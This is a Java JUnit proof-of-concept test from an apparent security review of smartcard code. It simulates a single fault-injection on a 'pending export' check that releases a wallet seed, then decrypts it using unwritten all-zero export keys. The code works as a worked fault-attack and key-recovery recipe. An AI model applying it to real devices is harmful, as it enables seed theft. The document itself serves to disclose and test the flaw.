// SPDX-FileCopyrightText: 2026 QuantX
// SPDX-License-Identifier: AGPL-3.0-or-later
package org.qntx.card.review;

import static org.junit.jupiter.api.Assertions.*;
import static org.qntx.card.review.ReviewHost.*;

import org.junit.jupiter.api.Test;
import org.qntx.card.review.ReviewSession.Inner;
import org.qntx.card.sim.Fault;

/**
 * PoC (review): EXPORT P1=0x01 releases the seed payload guarded by a single coded read of the
 * pending-export flag (§9.13 precondition "pending export"; §16.2 item 4 does not name it among the
 * checks evaluated twice). One laser that makes that read report PENDING_EXPORT — simulated by
 * arming the woven {@code Session.pending} call site — releases {@code ct ‖ tag} encrypted under
 * the never-written pending export keys, which the platform leaves as 16 zero bytes. The host then
 * recovers the exact 64-byte seed with K_te = K_tm = 0¹⁶.
 *
 * <p>The test asserts the faulty behaviour on the current code: with the fault armed EXPORT P1=0x01
 * answers 9000 and the payload decrypts to the seed; without it the card refuses 6985.
 */
final class SpofExportPendingTest {

    private static final byte[] S0 =
            unhex(
                    "00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF"
                            + "00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF");
    private static final byte[] H0 = sha256("review access hash H0".getBytes());
    private static final byte[] HT = sha256("review access hash HT".getBytes());
    private static final short PENDING_EXPORT = (short) 0x6996;

    @Test
    void controlWithoutFault() {
        ReviewCard c = ReviewCard.uninitialised();
        c.blank();
        FakeMember m = new FakeMember(ReviewCard.CA);
        ReviewSession s = c.create(S0, H0, m.cardId);
        try {
            Inner r = s.cmd((byte) 0x41, (byte) 0x01, (byte) 0, HT);
            assertEquals(0x6985, r.sw, "control: no pending export must give 6985");
        } finally {
            Fault.reset();
        }
    }

    @Test
    void seedExfiltrationByOnePendingFault() {
        ReviewCard c = ReviewCard.uninitialised();
        c.blank();
        FakeMember m = new FakeMember(ReviewCard.CA);
        ReviewSession s = c.create(S0, H0, m.cardId);
        try {
            // dry run: Session.pending is evaluated exactly once inside EXPORT P1=0x01
            Fault.countCalls();
            Inner refused = s.cmd((byte) 0x41, (byte) 0x01, (byte) 0, HT);
            assertEquals(0x6985, refused.sw);
            int calls = Fault.calls("Session.pending");
            assertEquals(1, calls, "EXPORT P1=0x01 must evaluate pending() exactly once");

            Fault.arm("Session.pending", 1, PENDING_EXPORT);
            Inner e1 = s.cmd((byte) 0x41, (byte) 0x01, (byte) 0, HT);
            Fault.reset();
            assertEquals(
                    0x9000,
                    e1.sw,
                    "one pending() fault must release the payload (observed "
                            + String.format("%04X", e1.sw)
                            + ")");
            assertEquals(160, e1.data.length, "ct ‖ tag for c = 2");

            // the pending export keys were never written: 16 zero bytes each
            byte[] zero = new byte[16];
            byte[] ct = slice(e1.data, 0, e1.data.length - 16);
            byte[] tag = slice(e1.data, e1.data.length - 16, 16);
            assertArrayEquals(cmac(zero, ct), tag, "CMAC under K_tm = 0 must verify");
            byte[] payload = unM2(cbcInv(zero, new byte[16], ct));
            assertNotNull(payload, "AES-CBC under K_te = 0 must unpad");
            assertEquals(130, payload.length);
            assertEquals(0x02, payload[0] & 0xFF, "origin = imported (CREATE P1=0x01)");
            assertArrayEquals(S0, slice(payload, 1, 64), "the 64-byte seed left the card");
            assertArrayEquals(HT, slice(payload, 65, 32));
            assertEquals(0x02, payload[97] & 0xFF, "c = 2");
            assertArrayEquals(cardId(s.cardA), slice(payload, 98, 16));
            assertArrayEquals(m.cardId, slice(payload, 114, 16));
        } finally {
            Fault.reset();
        }
    }
}
